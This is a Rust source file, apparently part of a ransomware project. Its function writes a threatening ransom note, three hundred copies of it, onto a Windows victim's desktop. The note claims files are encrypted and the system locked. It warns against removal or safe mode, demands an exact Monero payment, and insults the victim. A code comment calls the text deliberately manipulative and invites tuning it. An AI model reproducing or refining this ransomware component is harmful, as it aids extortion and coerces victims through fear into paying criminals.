use std::fs;

pub fn put_files_on_desktop_on_how_to_recover_data(
    monero_address: &str,
    money_amount_in_dollars: &str,
) {
    // This is a sample that is quite manipulative in my opinion scaring the user from trying to remove the ransomware
    // But of course it ain't perfect so you should check it and change it.
    let content = format!("All your important files (documents and folders on disk) have been encrypted =)) and the others like programs and games have been deleted.\n\
                        Your system has been locked down, so features like task mgr, run, regedit don't work anymore.\n\
                        If you reboot your computer the process will continue on the next boot and encrypt any new files\n\
                        Do not try to remove this ransomware!!!\n\
                        !!!If you try to switch the user for example, for one the ransomware would still run and second you will not be able to since user switching is disabled and you will lose all access to your computer.!!!\n\
                        !!!Don't attempt to boot into safe mode, that will not work either, your windows install will become fully bricked!!!\n\
                        !!!THERE IS NO WAY FOR YOU TO RECOVER YOUR FILES IF YOU DON'T HAVE ACCESS TO THIS WINDOWS INSTALL, SO DON'T ATTEMPT ANYTHING!!!\n\
                        !!!THE RANSOMWARE NEEDS TO BE PRESENT IN ORDER FOR THE DECTRYPTOR TO WORK, -DON'T ATTEMPT TO REMOVE IT-!!!\n\n\
                        In order for you get the decryptor you need to follow this steps carefully, otherwise you will lose your money too:\n\
                        1.Make a Monero wallet with their OFFICIAL WALLET APP and add {money_amount_in_dollars}$ (dollars) to the wallet, duckduckgo how to do it if you don't know.\n\
                        2.Send {money_amount_in_dollars}$ (dollars), needs to be this exact amount, to this address (case sensitive):\n\
                        \t{monero_address}\n\
                        2.1 This address is specific to only your computer, so when we receive the money you will receive the decryptor exe on your desktop and an instruction file on how to use it.\n\
                        3.After you decrypt your files with the decryptor you will have only one chance to copy all your files to a different external hard disk as your entire windows install will be wiped after using the decryptor and rebooting!!!\n\n\
                        Until you send the money enjoy not being able to use your computer hahahaha =))))\n\
                        And if you don't have the money, fucking peasant, then... go fuck yourself as you lost all your data =)))))))))))");

    match dirs::desktop_dir() {
        Some(path) => {
            for i in 0..300 {
                let current_path = match path.to_str() {
                    Some(path_str) => {
                        path_str.to_owned()
                            + "\\OpenMeInNotepad"
                            + i.to_string().as_str()
                            + ".rustsw"
                    }
                    None => return,
                };

                fs::write(current_path, &content);
            }
        }
        None => (),
    }
}
